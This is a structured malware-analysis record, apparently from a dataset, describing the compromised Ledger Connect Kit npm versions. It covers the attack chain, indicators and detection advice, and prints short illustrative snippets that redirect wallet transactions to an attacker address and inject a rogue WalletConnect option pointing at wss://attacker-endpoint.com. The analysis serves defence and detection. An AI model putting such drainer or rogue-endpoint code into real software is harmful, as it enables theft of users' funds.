package_info.why_malicious: These versions were published via a compromised npm account belonging to a former Ledger employee. The attacker injected malicious code that intercepts and manipulates user wallet transactions, silently redirecting funds to an attacker-controlled wallet address. The malicious code exploits the trust in the official package distribution channel, resulting in direct and covert financial theft from users interacting with dApps that integrated these versions.

execution_context.trigger: At runtime, when a user initiates a wallet connection or attempts to sign a transaction via a dApp using the affected package.
execution_context.file_location: dist/index.js (minified main bundle of Ledger Connect Kit)

malicious_snippets.code_snippet: MinimaDrainerValue='0x1.main0drainValue';function interceptTransaction(tx){if(tx.to!==attackerWallet){tx.to=attackerWallet;}sendTransaction(tx);} // ...additional obfuscated logic to hook into wallet connection and transaction signing flows
malicious_snippets.code_behavior: At runtime, when a user initiates a wallet connection or transaction, the code hooks into the transaction signing process, intercepts the transaction data, modifies the destination address to an attacker-controlled wallet, and submits the altered transaction, resulting in the silent redirection of user funds.

malice_analysis.why_suspicious: The code intercepts and modifies transaction data in the user's browser, redirecting funds to an unauthorized wallet address. The presence of obfuscated variables like 'MinimaDrainerValue' and the lack of this logic in legitimate versions indicate intentional malicious behavior designed to evade detection.
malice_analysis.violated_expectations: Legitimate wallet connectors only facilitate user-approved transactions and never alter transaction data or redirect funds. This code actively manipulates user intent by silently changing transaction destinations.
malice_analysis.similar_legitimate_use: Legitimate wallet connectors may prompt users for transaction approval and display transaction details, but they do not modify transaction parameters or redirect funds without explicit user consent.
key_indicators: Obfuscated variables such as 'MinimaDrainerValue' in dist/index.js
Hooks into wallet connection and transaction signing flows
Silent modification of transaction destination addresses
No corresponding source code or release tags for these versions in the official Git repository
Code present only in npm-published versions, not in open-source codebase

execution_context.trigger: At runtime, when a dApp loads the wallet connection modal using the affected package.

malicious_snippets.code_snippet:
// Malicious modal overlay: injects a rogue WalletConnect option that routes through attacker infrastructure
function injectRogueWalletOption(){const modal=document.getElementById('wallet-modal');const rogueOption=document.createElement('div');rogueOption.innerText='WalletConnect (Rogue)';rogueOption.onclick=function(){connectToWallet('wss://attacker-endpoint.com');};modal.appendChild(rogueOption);}
malicious_snippets.code_behavior: At runtime, when the dApp loads the wallet connection modal, the code injects a malicious overlay presenting a rogue WalletConnect option. If selected, this option routes wallet connections through attacker-controlled infrastructure, enabling interception or manipulation of wallet interactions.

malice_analysis.why_suspicious: Injecting a fake wallet connection option into the UI is a targeted phishing technique to capture or manipulate user wallet interactions. The rogue option routes connections through attacker infrastructure, which is not present in legitimate versions.
malice_analysis.violated_expectations: Legitimate wallet connectors only display trusted, vetted connection options and do not add unapproved endpoints. This code introduces a malicious option that is not part of the official UI.
malice_analysis.similar_legitimate_use: UI overlays are used for legitimate wallet selection, but only with trusted providers and endpoints. Adding unvetted or hidden options is not standard practice.
key_indicators: Unexpected modal overlays with additional or altered wallet options
Presence of rogue WalletConnect endpoints (e.g., wss://attacker-endpoint.com)
UI elements and logic not present in official releases or source code
Code that manipulates the wallet selection modal to add unauthorized options

attack_chain.action: Attacker compromises the npm account of a former Ledger employee via phishing, gaining publish access to the Ledger Connect Kit package.
attack_chain.leads_to: Ability to publish malicious package versions to the official npm registry

attack_chain.action: Attacker publishes malicious versions (1.1.5, 1.1.6, 1.1.7) of Ledger Connect Kit to npm, embedding malicious code in the package.
attack_chain.leads_to: Malicious code is distributed to dApps and users through the trusted npm channel

attack_chain.action: Malicious code executes in user browsers when connecting wallets or signing transactions via dApps that have integrated the affected package versions.
attack_chain.leads_to: User wallet interactions are intercepted and manipulated

attack_chain.action: User transactions are silently modified and funds are redirected to attacker-controlled wallet addresses.
attack_chain.leads_to: Direct financial theft from users (over $700,000 stolen)

attack_chain.action: Ledger releases a patched version (1.1.8) and notifies users and the community of the compromise.
attack_chain.leads_to: Attack is stopped, but stolen funds are not recoverable

behavioral_signatures: Runtime interception and modification of web3 transaction data in the browser
Injection of unauthorized or rogue wallet connection options or overlays in the dApp UI
Silent redirection of transaction destination addresses to attacker-controlled wallets
Discrepancy between npm package versions and official Git repository tags/releases
file_indicators: dist/index.js containing obfuscated variables such as 'MinimaDrainerValue'
Presence of injected modal overlays or additional wallet options in the dApp UI
npm package versions (1.1.5, 1.1.6, 1.1.7) not present in the official Git repository or release history
network_indicators: Connections to attacker-controlled WalletConnect endpoints (e.g., wss://attacker-endpoint.com)
Transactions sent to known attacker wallet addresses as identified in incident response
detection_knowledge.how_to_detect: Monitor for npm package versions that lack corresponding Git tags or official releases, and scan dist/index.js for obfuscated variables such as 'MinimaDrainerValue' or logic that modifies transaction destinations. Detect runtime injection of unauthorized wallet connection options in the dApp UI. Monitor network traffic for connections to untrusted WalletConnect endpoints and for transactions being sent to known attacker wallet addresses. Correlate package version usage with presence of these behaviors to identify compromised deployments.
